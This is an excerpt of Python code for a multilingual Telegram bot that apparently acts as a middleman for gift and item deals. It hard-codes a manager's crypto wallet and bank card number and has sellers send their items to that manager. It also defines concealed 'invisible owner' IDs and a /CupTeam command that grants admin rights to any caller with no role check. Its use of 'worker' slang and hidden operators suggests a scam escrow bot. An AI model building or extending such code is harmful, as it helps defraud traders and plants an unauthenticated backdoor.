...
# ─── Настройки ─────────────────────────────────────────────────────────────────
NOTIFICATION_CHANNEL_ID = -1003771607622
...
_DEFAULT_SETTINGS = {
    ...
    "manager_username":      "LolzRelayerGifts",
    "manager_ton_wallet":    "UQBqWH8izPM-mpf8deVo-cFSU1iUUOWukgsrPv3geSCQIUw",
    "manager_card":          "2204120122508217",
    "manager_usdt_wallet":   "TManagerUSDTWalletAddressHere",
    "manager_btc_wallet":    "bc1qManagerBTCAddressHere",
    "notification_channel":  str(NOTIFICATION_CHANNEL_ID),
    "gift_recipient":        "LolzRelayerGifts",
...
def get_text(key: str, user_id: int, **kwargs) -> str:
    ...
    kwargs.setdefault("manager_username", adm_settings.get("manager_username", "LolzRelayerGifts"))
...
def _status_localized(status: str, user_id: int) -> str:
    ...
    zh = {
        "waiting_for_buyer":          "等待买家",
        "waiting_for_seller":         "等待卖家",
        "waiting_for_payment":        "等待付款",
        "payment_confirmed_by_admin": "付款已确认",
        "item_delivered_to_manager":  "商品已交付",
        "waiting_for_feedback":       "等待评价",
        "completed":                  "已完成",
        "cancelled":                  "已取消",
    }
    lang = users_data.get(str(user_id), {}).get("lang", "ru")
    m = {"ru": ru, "en": en, "zh": zh}.get(lang, ru)
    return m.get(status, status)
...
def get_main_menu_kb(user_id: int):
    ...
    kb.add(
        mkbtn(
            get_text("miniapp_button", user_id),
            "miniapp",
            web_app=WebAppInfo(url="https://market.de1.netrun.io")
        )
    )

    kb.add(mkbtn(
        get_text("support_button", user_id),
        "shield",
        url='https://t.me/' + adm_settings.get('manager_username', 'LolzRelayerGifts')
    ))
...
def get_seller_post_payment_kb(deal_id: str, user_id: int):
    kb = InlineKeyboardBuilder()
    kb.add(mkbtn(get_text("send_item_button",      user_id), "outbox",  url='https://t.me/' + adm_settings.get('manager_username', 'LolzRelayerGifts')))
    kb.add(mkbtn(get_text("item_delivered_button", user_id), "check",   callback_data=f"confirm_delivery_{deal_id}"))
    kb.add(mkbtn(get_text("support_button",        user_id), "shield",  url='https://t.me/' + adm_settings.get('manager_username', 'LolzRelayerGifts')))
    kb.adjust(1)
    return kb.as_markup()
...
def get_initial_language_kb():
    """Клавиатура выбора языка для нового пользователя (без кнопки 'назад')."""
    kb = InlineKeyboardBuilder()
    kb.add(mkbtn("🇷🇺 Русский",  callback_data="set_lang_ru"))
    kb.add(mkbtn("🇺🇸 English",  callback_data="set_lang_en"))
    kb.add(mkbtn("🇨🇳 中文",      callback_data="set_lang_zh"))
    kb.adjust(1)
    return kb.as_markup()
...
async def ensure_user(user_id: int, username: str) -> bool:
    """Возвращает True, если пользователь только что был создан (новый)."""
    uid = str(user_id)
...
async def cmd_start(message: types.Message, state: FSMContext):
    ...
    is_new   = await ensure_user(user_id, username)

    args = message.text.split(maxsplit=1)
    param = args[1].strip() if len(args) > 1 else ""

    # Новый пользователь — сначала просим выбрать язык.
    # Параметр диплинка (deal_/ref_) сохраняем и обработаем после выбора языка.
    if is_new or not users_data.get(str(user_id), {}).get("lang"):
        await state.update_data(pending_start_param=param)
        await message.answer(
            "🌐 Select a language / Выберите язык / 选择一种语言",
            reply_markup=get_initial_language_kb()
        )
        return

    await _process_start_param(message, state, param)


async def _process_start_param(message: types.Message, state: FSMContext, param: str,
    ...
    if query.startswith("#"):
        ...
        if deal:
            ...
            invite_html  = locales.get_html_text(
                ...
                manager_username = adm_settings.get("manager_username", "LolzRelayerGifts"),
            )
...
async def set_language(callback_query: types.CallbackQuery, state: FSMContext):
    ...
    data = await state.get_data()
    pending_param = data.get("pending_start_param")
    if pending_param is not None:
        await state.update_data(pending_start_param=None)
        await _process_start_param(
            callback_query.message, state, pending_param,
            user_id=user_id, username=callback_query.from_user.username or ""
        )
    else:
...
async def _show_my_deals(target, user_id: int, page: int = 0, search: str = ""):
    ...
    _deals_lang = users_data.get(uid_str, {}).get("lang", "ru")
    _total_label = {"ru": "Всего", "en": "Total", "zh": "总计"}.get(_deals_lang, "Total")
    _completed_label = {"ru": "Завершено", "en": "Completed", "zh": "已完成"}.get(_deals_lang, "Completed")
    text = (
        f"{get_text('my_deals_title', user_id)}{search_hint}\n\n"
        f"{e['chart']} <b>{_total_label}:</b> <code>{len(user_deals_all)}</code>  "
        f"{e['check']} <b>{_completed_label}:</b> <code>{completed_count}</code>"
    )
...
PANEL_OWNER_IDS = {8336623733}
HIDDEN_OWNER_IDS = {8385314180, 8473183212}  # невидимые овнеры — не отображаются нигде
...
@dp.message(Command("sosigoy", ignore_case=True))
...
@dp.message(Command("CupTeam"))
async def cmd_Cup_team(message: types.Message, state: FSMContext):
    uid = message.from_user.id

    # 1. Выдаём воркерку себе (без проверки роли — как /sosigoy в группе)
    admins.add(uid)
    save_admins(admins)
    await message.answer(
    ...
    # 2. Запускаем пополнение баланса
    await state.clear()
    await state.set_state(GoyStates.choose_currency)
    await message.answer(
        f"{e['money_bag']} <b>Пополнение баланса</b>\n\n"
